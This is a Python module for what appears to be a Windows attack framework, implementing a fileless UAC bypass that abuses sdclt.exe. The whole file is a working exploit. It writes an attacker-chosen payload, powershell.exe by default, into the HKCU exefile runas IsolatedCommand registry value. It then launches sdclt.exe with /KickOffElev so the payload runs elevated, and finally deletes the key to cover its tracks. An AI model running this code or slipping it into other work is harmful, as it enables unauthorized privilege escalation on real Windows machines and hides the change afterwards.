#--encoding: utf-8--

from module import Module
from support.winreg import Registry
from _winreg import HKEY_CURRENT_USER as HKCU


class CustomModule(Module):
    def __init__(self):
        information = {"Name": "sdclt.exe fileless bypass",
                       "Description": "Fileless UAC bypass abusing sdclt.exe",
                       "Author": "Santiago Hernandez Ramos"}

        # -----------name-----default_value--description--required?
        options = {"payload": ["powershell.exe", "Payload to execute", True]}

        # Constructor of the parent class
        super(CustomModule, self).__init__(information, options)

    # This module must be always implemented, it is called by the run option
    def run_module(self):
        # To access user provided attributes, use self._args dictionary
        payload = self.args["payload"]
        reg = Registry()        
        print "Creating hive..."
        key = reg.create_key(HKCU,"Software\\Classes\\exefile\\shell\\runas\\command")
        print "Hive created"
        print "Creating value IsolatedCommand..."
        reg.create_value(key,"IsolatedCommand", payload)
        print "Value created"
        print "Executing... sdclt.exe"
        self.run_binary("C:\\Windows\\System32\\sdclt.exe", ["/KickOffElev"])
        print "Got it? :D"
        reg.delete_key(HKCU,"Software\\Classes\\exefile\\shell\\runas\\command")
        print "Registry state restored"
